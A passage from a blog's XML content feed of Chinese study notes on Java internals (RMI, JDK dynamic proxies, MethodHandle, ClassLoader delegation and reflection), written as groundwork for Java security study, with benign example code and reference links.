class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/imgs/image-20200609170235235.png" alt="image-20200609170235235" style="zoom:50%;" /><img src="/imgs/image-20200609170331156.png" alt="image-20200609170331156" style="zoom:50%;" /><p>现在看完例子，可以梳理下：</p><img src="/imgs/image-20200609170552480.png" alt="image-20200609170552480" style="zoom:67%;" /><p>货物-远程对象、备货员-server、货架-骨架；</p><p>消费者-client、购买凭证-存根；</p><p>小货仓-RMI Registry</p><p>可以把Java RMI理解成地铁站的无人售货机</p><p>1、备货员先将货物信息存到<strong>小货仓</strong>，保证售货机有货物</p><p>2、消费者购买需要在显示屏的找到要买的物品然后进行支付，支付完成获取到了<strong>购买凭证</strong></p><p>3、消费者通过购买凭证，告诉售货机我要获取某个货物，然后售货机在<strong>货架</strong>上找到目标货物推到售货口，消费者通过可以获取到货物。</p><h2 id="0x03-扩展"><a href="#0x03-扩展" class="headerlink" title="0x03 扩展"></a>0x03 扩展</h2><p>RMI原理</p><ol><li>将可以远程调用的对象进行序列化，然后绑定到RMI Server（被调方，运行者）中作为存根（stub）</li><li>RMI Client 会先去下载stub<strong>反序列化</strong>然后发起client调用，RMI 底层（RMI Interface Layer &amp; Transport Layer）会讲请求参数封装发送到RMI Server </li><li>RMI Server 接收到封装的参数，传递给骨架（skeleton），由桩解析参数并且以参数调用对应的存根（stub）方法。</li><li>存根方法在RMI Server执行完毕之后，返回结果将被RMI底层封装并传输给RMI Client（也就是主调方，调用者）</li></ol><p>这里有一点需要注意：RMI是基于序列化和反序列化的，远程对象在进行注册时，序列化作为存根，客户端调用的时候会把序列化后的对象进行反序列化再调用。</p><p>参考链接：</p><p><a href="https://www.jianshu.com/p/de85fad05dcb" target="_blank" rel="noopener">https://www.jianshu.com/p/de85fad05dcb</a></p><p><a href="https://www.jianshu.com/p/5c6f2b6d458a" target="_blank" rel="noopener">https://www.jianshu.com/p/5c6f2b6d458a</a></p><p><a href="https://segmentfault.com/a/1190000016598069" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016598069</a></p><p><a href="https://blog.csdn.net/qq_28081453/article/details/83279066" target="_blank" rel="noopener">https://blog.csdn.net/qq_28081453/article/details/83279066</a></p><p><a href="https://www.cnblogs.com/lvyahui/p/5425507.html" target="_blank" rel="noopener">https://www.cnblogs.com/lvyahui/p/5425507.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态代理</title>
      <link href="2020/06/13/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>2020/06/13/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，<strong>代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等</strong>。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。简单的说就是，我们在访问实际对象时，是通过代理对象来访问的，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p><p>简而言之就是接口和实现接口的类，接口定义了某种方法，实现接口的类需要去重写方法。</p><p>但是静态代理只能代理一个类，如果有多个类需要代理就不能用静态代理实现了，这时候要用动态代理来实现。动态代理可以很方便的对代理类的函数进行统一的处理（invoke），而不是修改每个代理类的函数，更灵活和扩展。</p><p>与静态代理相比，动态代理是在<strong>运行时</strong>动态生成一个代理类（Java反射机制可以在运行时生成类），该类可以对目标对象的方法进行功能增强。之前学习Java反射机制时提到了反射机制可以生成动态代理，</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>网上看Java动态代理貌似有两种，基于JDK的动态代理和基于CGILB的动态代理，我们在这里只学习下JDK的动态代理，如果后面要用到另一种，再去学习。JDK动态代理有两个重要的类或接口， InvocationHandler(Interface)和Proxy(Class)，实现我们动态代理必须用到它们。先来看下这两个类。</p><h3 id="InvocationHandler-Interface"><a href="#InvocationHandler-Interface" class="headerlink" title="InvocationHandler(Interface)"></a>InvocationHandler(Interface)</h3><p>先来看下，里面的源码是我加的注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> InvocationHandler&#125; is the interface implemented by</span></span><br><span class="line"><span class="comment"> * the &lt;i&gt;invocation handler&lt;/i&gt; of a proxy instance.</span></span><br><span class="line"><span class="comment"> * InvocationHandler是一个接口，被代理实例实现</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Each proxy instance has an associated invocation handler.</span></span><br><span class="line"><span class="comment"> * When a method is invoked on a proxy instance, the method</span></span><br><span class="line"><span class="comment"> * invocation is encoded and dispatched to the &#123;<span class="doctag">@code</span> invoke&#125;</span></span><br><span class="line"><span class="comment"> * method of its invocation handler.</span></span><br><span class="line"><span class="comment"> *每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，</span></span><br><span class="line"><span class="comment"> *当我们通过代理对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke 方法来进行调用</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Peter Jones</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>         Proxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>       1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Processes a method invocation on a proxy instance and returns</span></span><br><span class="line"><span class="comment">     * the result.  This method will be invoked on an invocation handler</span></span><br><span class="line"><span class="comment">     * when a method is invoked on a proxy instance that it is</span></span><br><span class="line"><span class="comment">     * associated with.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   proxy the proxy instance that the method was invoked on</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   method the &#123;<span class="doctag">@code</span> Method&#125; instance corresponding to</span></span><br><span class="line"><span class="comment">     * the interface method invoked on the proxy instance.  The declaring</span></span><br><span class="line"><span class="comment">     * class of the &#123;<span class="doctag">@code</span> Method&#125; object will be the interface that</span></span><br><span class="line"><span class="comment">     * the method was declared in, which may be a superinterface of the</span></span><br><span class="line"><span class="comment">     * proxy interface that the proxy class inherits the method through.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   args an array of objects containing the values of the</span></span><br><span class="line"><span class="comment">     * arguments passed in the method invocation on the proxy instance,</span></span><br><span class="line"><span class="comment">     * or &#123;<span class="doctag">@code</span> null&#125; if interface method takes no arguments.</span></span><br><span class="line"><span class="comment">     * Arguments of primitive types are wrapped in instances of the</span></span><br><span class="line"><span class="comment">     * appropriate primitive wrapper class, such as</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> java.lang.Integer&#125; or &#123;<span class="doctag">@code</span> java.lang.Boolean&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  the value to return from the method invocation on the</span></span><br><span class="line"><span class="comment">     * proxy instance.  If the declared return type of the interface</span></span><br><span class="line"><span class="comment">     * method is a primitive type, then the value returned by</span></span><br><span class="line"><span class="comment">     * this method must be an instance of the corresponding primitive</span></span><br><span class="line"><span class="comment">     * wrapper class; otherwise, it must be a type assignable to the</span></span><br><span class="line"><span class="comment">     * declared return type.  If the value returned by this method is</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> null&#125; and the interface method's return type is</span></span><br><span class="line"><span class="comment">     * primitive, then a &#123;<span class="doctag">@code</span> NullPointerException&#125; will be</span></span><br><span class="line"><span class="comment">     * thrown by the method invocation on the proxy instance.  If the</span></span><br><span class="line"><span class="comment">     * value returned by this method is otherwise not compatible with</span></span><br><span class="line"><span class="comment">     * the interface method's declared return type as described above,</span></span><br><span class="line"><span class="comment">     * a &#123;<span class="doctag">@code</span> ClassCastException&#125; will be thrown by the method</span></span><br><span class="line"><span class="comment">     * invocation on the proxy instance.</span></span><br><span class="line"><span class="comment">     *........</span></span><br><span class="line"><span class="comment">     * .......</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     UndeclaredThrowableException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *唯一要去实现的方法：invoke</span></span><br><span class="line"><span class="comment">     *三个参数：Object proxy, Method method, Object[] args</span></span><br><span class="line"><span class="comment">     *proxy:代理的对象</span></span><br><span class="line"><span class="comment">     *method:调用真实对象的某个方法的Method对象</span></span><br><span class="line"><span class="comment">     *args:调用真实对象某个方法时接受的参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Proxy-Class"><a href="#Proxy-Class" class="headerlink" title="Proxy(Class)"></a>Proxy(Class)</h3><p>Proxy这个类的作用就是用来动态创建一个代理对象的类。如下图，可以看到Proxy实现了Serializable接口，他有很多成员变量和方法，其中newProxyInstance是需要经常用到的，所以就分析它好了。</p><img src="/imgs/image-20200606110709033.png" alt="image-20200606110709033" style="zoom:80%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure><p>loader:一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理对象进行加载<br>interfaces:一个Interface对象的数组，表示的是我将要给我需要代理的对象提供一组什么接口，<strong>如果我提供了一组接口给它，那么这个代理对象就宣称实现了该接口(多态)，这样我就能调用这组接口中的方法了</strong><br>h:一个InvocationHandler对象，表示的是当我这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上</p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>newProxyInstance需要三个参数（目标接口，实现目标接口的子类，扩展处理器-处理目标接口的handler），首先把三个参数准备好分别是ImpTest.class.getClassLoader()、ImpTest.class.getInterfaces()和handler，测试的时候遇到一个错误，就是代理类必须要实现接口，我们代理的时候是代理接口的方法，这里是Test.test()和Test.test1()，所以当我们调用proxy.test()和proxy.test1()都会去调用handler.invoker()方法。</p><p>所以就是说在这个实例中，我们是用handler.invoker()去代理Test接口的所有方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Handler handler = <span class="keyword">new</span> Handler(<span class="keyword">new</span> ImpTest());</span><br><span class="line">        <span class="comment">// proxy必须以代理类的接口作为类型，否则会报错</span></span><br><span class="line">        Test proxy = (Test)Proxy.newProxyInstance(ImpTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">ImpTest</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">handler</span>)</span>;</span><br><span class="line">        System.out.println(proxy.test());</span><br><span class="line">        System.out.println(proxy.test1(<span class="string">" 123"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> String <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test1</span><span class="params">(String a)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImpTest</span> <span class="keyword">implements</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"这里是被代理类的方法:test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test1</span><span class="params">(String a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"这里是被代理类的方法:test1"</span> + a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    Handler(Object object)&#123;</span><br><span class="line">        <span class="keyword">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">"test"</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">"在这里调用test方法"</span>);</span><br><span class="line">            System.out.println(method.invoke(object, args));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"test"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method.getName().equals(<span class="string">"test1"</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">"在这里调用test1方法"</span>);</span><br><span class="line">            System.out.println(method.invoke(object, args));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"test1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/imgs/Snipaste_2021-06-16_14-33-49.png" alt="image-20200728144025777"></p><h2 id="动态代理具体步骤："><a href="#动态代理具体步骤：" class="headerlink" title="动态代理具体步骤："></a>动态代理具体步骤：</h2><ol><li>通过实现 InvocationHandler 接口创建自己的调用处理器；</li><li>通过为 Proxy 类指定 ClassLoader 对象和一组 interface 来创建动态代理类；</li><li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li><li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li></ol><p>参考链接：</p><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html" target="_blank" rel="noopener">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></p><p><a href="https://blog.csdn.net/weixin_40558287/article/details/103058052" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40558287/article/details/103058052</a></p><p><a href="https://blog.csdn.net/qq_32532321/article/details/81874990" target="_blank" rel="noopener">https://blog.csdn.net/qq_32532321/article/details/81874990</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714" target="_blank" rel="noopener">https://www.jianshu.com/p/9bcac608c714</a></p><p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoluo501395377/p/3383130.html</a></p><p><a href="https://www.anquanke.com/post/id/202730" target="_blank" rel="noopener">https://www.anquanke.com/post/id/202730</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java.lang.invoke.MethodHandle</title>
      <link href="2020/06/13/MethodHandle/"/>
      <url>2020/06/13/MethodHandle/</url>
      
        <content type="html"><![CDATA[<p>JDK7为间接调用方法引入新的API - MethodHandle，可以看作反射的升级版。</p><p>MethodHandle是什么？简单的说就是方法句柄，通过这个句柄可以调用相应的方法</p><p>用MethodHandle调用方法的流程为：</p><ol><li>创建MethodType,获取指定方法的签名</li><li>在Lookup中查找MethodType的方法句柄MethodHandle</li><li>传入方法参数通过MethodHandle调用方法</li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandle;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandles;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodHandlerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable  </span>&#123;</span><br><span class="line">        MethodHandles.Lookup lookup = MethodHandles.lookup();</span><br><span class="line">        MethodType mt = MethodType.methodType(String<span class="class">.<span class="keyword">class</span>,<span class="title">char</span>.<span class="title">class</span>,<span class="title">char</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MethodHandle mh = lookup.findVirtual(String.class,"replace", mt);</span><br><span class="line">            String handled_str = (String) mh.invoke(<span class="string">"abc"</span>,<span class="string">'a'</span>,<span class="string">'c'</span>);</span><br><span class="line">            System.out.print(handled_str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：cbc</p><img src="/imgs/image-20200605203159266.png" alt="image-20200605203159266" style="zoom:50%;" /><p>参考链接：</p><p><a href="https://www.cnblogs.com/Mrfanl/p/10544251.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrfanl/p/10544251.html</a></p><p><a href="https://www.cnblogs.com/zhangxh20/p/7086622.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangxh20/p/7086622.html</a></p><p><a href="https://www.zhihu.com/question/40427344/answer/252825611" target="_blank" rel="noopener">https://www.zhihu.com/question/40427344/answer/252825611</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MethodHandle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ClassLoader</title>
      <link href="2020/06/12/ClassLoader/"/>
      <url>2020/06/12/ClassLoader/</url>
      
        <content type="html"><![CDATA[<h3 id="1、Java程序如何运行"><a href="#1、Java程序如何运行" class="headerlink" title="1、Java程序如何运行"></a>1、Java程序如何运行</h3><p>一个Java程序的运行整个过程分为编译时和运行时。首先原始的java程序先由java编译器javac来编译成字节码，即.class文件，然后有ClassLoader类加载器加载类的常量、方法等到内存，字节码校验器对变量初始化、方法调用、堆栈溢出等进行校验，如果校验没问题，就会交给执行引擎解释执行最终生成机器码给操作系统执行。</p><p><img src="/imgs/image-20200904201321479.png" alt="image-20200904201321479"></p><h3 id="2、了解ClassLoader工作机制"><a href="#2、了解ClassLoader工作机制" class="headerlink" title="2、了解ClassLoader工作机制"></a>2、了解ClassLoader工作机制</h3><p>我们已经知道ClassLoader是负责加载类，那么到底怎么去加载？</p><img src="/imgs/image-20200904203656218.png" alt="image-20200904203656218" style="zoom:50%;" /><p>学习这篇文章<a href="https://juejin.im/post/6844903729435508750" target="_blank" rel="noopener">https://juejin.im/post/6844903729435508750</a> ，总算弄懂ClassLoader怎么运作的。</p><p>JVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。</p><p><strong>BootstrapClassLoader</strong> 负责加载 JVM 运行时核心类，这些类位于 $JAVA_HOME/lib/rt.jar 文件中【rt是runtime的简写】，我们常用内置库 <a href="http://java.xxx" target="_blank" rel="noopener">java.xxx</a>.* 都在里面，比如 java.util.<em>、<a href="http://java.io" target="_blank" rel="noopener">java.io</a>.<em>、java.nio.</em>、java.lang.</em> 等等。</p><p><strong>ExtensionClassLoader</strong> 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 $JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。</p><p><strong>AppClassLoader</strong> 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。</p><p><strong>双亲委派</strong>：AppClassLoader 在加载一个<strong>未知的类名</strong>时，它并不是立即去搜寻 Classpath，它会首先将这个类名称交给 ExtensionClassLoader 来加载，如果 ExtensionClassLoader 可以加载，那么 AppClassLoader 就不用麻烦了。否则它就会搜索 Classpath 。而 ExtensionClassLoader 在加载一个未知的类名时，它也并不是立即搜寻 ext 路径，它会首先将类名称交给 BootstrapClassLoader 来加载，如果 BootstrapClassLoader 可以加载，那么 ExtensionClassLoader 也就不用麻烦了。否则它就会搜索 ext 路径下的 jar 包。这三个 ClassLoader 之间形成了<strong>级联的父子关系</strong>，每个 ClassLoader 都很懒，<strong>尽量把工作交给父亲做</strong>，父亲干不了了自己才会干。每个 ClassLoader 对象内部都会有一个 parent 属性指向它的父加载器。</p><p><strong>UserDefined ClassLoader</strong>: 这是开发人员通过拓展ClassLoader类定义的自定义加载器，加载程序员定义的一些类。</p><p>参考链接：</p><p><a href="https://yq.aliyun.com/articles/623212" target="_blank" rel="noopener">https://yq.aliyun.com/articles/623212</a></p><p><a href="https://juejin.im/post/6844903729435508750" target="_blank" rel="noopener">https://juejin.im/post/6844903729435508750</a></p><p><a href="https://www.jianshu.com/p/b47eb9d7b4af" target="_blank" rel="noopener">https://www.jianshu.com/p/b47eb9d7b4af</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ClassLoader </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制</title>
      <link href="2020/06/12/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>2020/06/12/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>了解Java反射机制前，先来看下Java怎么运行程序的？</p><p>通常我们知道先运行javac xxx.java再运行java xxx.class，对应起来就是编译生成.class字节码文件，再将.class文件通过JVM的类加载器加载到内存进行运行，所以Java运行分为两种状态编译时和运行时，而现在学习的Java反射机制是在运行时提供的功能。</p><h2 id="0x01-什么是Java反射机制"><a href="#0x01-什么是Java反射机制" class="headerlink" title="0x01 什么是Java反射机制"></a>0x01 什么是Java反射机制</h2><p>先来看下百度百科给出的概念：</p><p> Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射(Reflection)被视为动态语言的关键，反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><p>这里插入一张比较容易理解的图：</p><img src="/imgs/image-20200605144917651.png" alt="image-20200605144917651" style="zoom:50%;" /><p>简单来说 就是Java程序在<strong>运行时</strong> 还允许你通过反射机制获取某个对象的类，还能构造对象、获取对象属性、方法并且能调用方法。看到这里我大概能想到为什么反序列化远程代码执行漏洞能够存在了，在程序运行中，反序列化为一个对象，利用某个或某些类内部复杂的关系调用到反射机制然后执行某个运行命令的方法，从而完成命令执行。</p><h2 id="0x02-利用反射机制能做什么"><a href="#0x02-利用反射机制能做什么" class="headerlink" title="0x02 利用反射机制能做什么"></a>0x02 利用反射机制能做什么</h2><ol><li>在运行时判断任意一个对象所属的类；</li><li>在运行时构造任意一个类的对象；</li><li>在运行时判断任意一个类所具有的成员变量和方法；</li><li>在运行时调用任意一个对象的成员变量和方法；</li><li>生成动态代理。</li></ol><p>1-4刚刚概念里面都提到了，5动态代理没有提到，后面文章会着重学习下。</p><h2 id="0x03-在Java中如何实现反射"><a href="#0x03-在Java中如何实现反射" class="headerlink" title="0x03 在Java中如何实现反射"></a>0x03 在Java中如何实现反射</h2><p>关于Java反射机制主要有以下几个API</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Class; <span class="comment">//类               </span></span><br><span class="line">java.lang.reflect.Constructor;<span class="comment">//构造方法 </span></span><br><span class="line">java.lang.reflect.Field; <span class="comment">//类的成员变量       </span></span><br><span class="line">java.lang.reflect.Method;<span class="comment">//类的方法</span></span><br><span class="line">java.lang.reflect.Modifier;<span class="comment">//访问权限，诸如public, static等</span></span><br></pre></td></tr></table></figure><h3 id="java-lang-Class"><a href="#java-lang-Class" class="headerlink" title="java.lang.Class"></a>java.lang.Class</h3><p>对应可以实现 2.1在运行时判断任意一个对象所属的类</p><p>在Object类中定义了一个方法，此方法将被所有子类继承：public final Class 